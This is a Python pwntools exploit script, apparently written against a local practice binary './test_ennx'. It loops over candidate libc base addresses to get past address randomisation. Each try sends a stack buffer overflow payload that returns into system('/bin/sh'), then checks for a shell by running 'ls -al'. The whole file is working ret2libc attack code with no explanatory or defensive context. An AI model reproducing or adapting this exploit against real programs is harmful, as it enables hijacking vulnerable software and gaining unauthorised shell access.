from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')

binsh_off = 0x156b65
system_off = 0x3af00

i = 0x1000
while( i < 0x1000000):

	system_addr = i + system_off
	binsh_addr = i + binsh_off

	print "libc base : " + hex(i)
	print "system addr : %x, binsh addr : %x" %(system_addr , binsh_addr) 
	try:
		p = process("./test_ennx")

		saved_eip = 0x607d28
		p.recvline()
		payload = 'A'* 28 +  p32(system_addr) + p32(saved_eip) + p32(binsh_addr)
		p.sendline(payload)
		p.recvline()
	
		p.sendline("ls -al")
		p.recvuntil("sp00f")
	except EOFError:
		print "brute force failed!"
		p.close()
	else:
		print "brute force success!"
		p.close()
		break
	i = i + 0x1000


